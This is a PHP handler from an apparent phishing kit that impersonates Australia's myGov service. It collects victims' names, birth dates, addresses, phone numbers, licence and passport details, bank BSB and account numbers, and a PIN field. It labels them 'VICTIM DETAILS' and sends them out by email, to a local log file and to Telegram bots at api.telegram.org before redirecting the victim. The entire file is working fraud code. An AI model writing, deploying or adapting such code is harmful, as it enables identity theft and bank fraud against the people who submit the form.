<?php
$settings = include '../../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}

# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$first_name = $_POST['fname'];
$issued     = $_POST['issued'];
$address    = $_POST['address'];
$phone   = $_POST['phone'];
$acct    = $_POST['acct'];
$bsb     = $_POST['bsb'];
$reference  = $_POST['reference'];
$dlcard  = $_POST['dlcard'];
$dob        = $_POST['dob'];
$cpin       = $_POST['cpin'];



# Messsage

$message = "[ 🍁 MYGOV | CLIENT : {$client} 🍁 ]\n\n";
$message .= "********** [ ACCOUNT INFORMATION ] **********\n";
$message .= "# FULL NAME   : {$first_name}\n";
$message .= "# DOB         : {$dob}\n";
$message .= "# ADDRESS     : {$address}\n";
$message .= "# PHONE NUMBER     : {$phone}\n";
$message .= "# DL/PASSPORT         : {$issued}\n";
$message .= "# EXPIRY   : {$reference}\n";
$message .= "# DL CARD NO   : {$dlcard}\n";
$message .= "# BSB         : {$bsb}\n";
$message .= "# ACCOUNT     : {$acct}\n";

$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: <mygov@client_{$client}_site.com>" . "\r\n";
  $subject = "🍁MYGOV 🍁 PERSONAL 🍁 CLIENT #{$client} 🍁 {$IP}";
  $msg = strtoupper($message);
  mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, strtoupper($message));
  fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1") {
    $data = $message;  // Ensure $message is defined somewhere before this code
    $website = "https://api.telegram.org/{$settings['bot_url']}";  

    foreach ($chat_ids as $chat_id) {
        $send = ['chat_id' => $chat_id, 'text' => $data];

        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);

        // You can add error handling here based on the $result if desired.

        curl_close($ch);
    }
}

echo "<script>window.location.href = \"../session_reaccount\";</script>";

?>
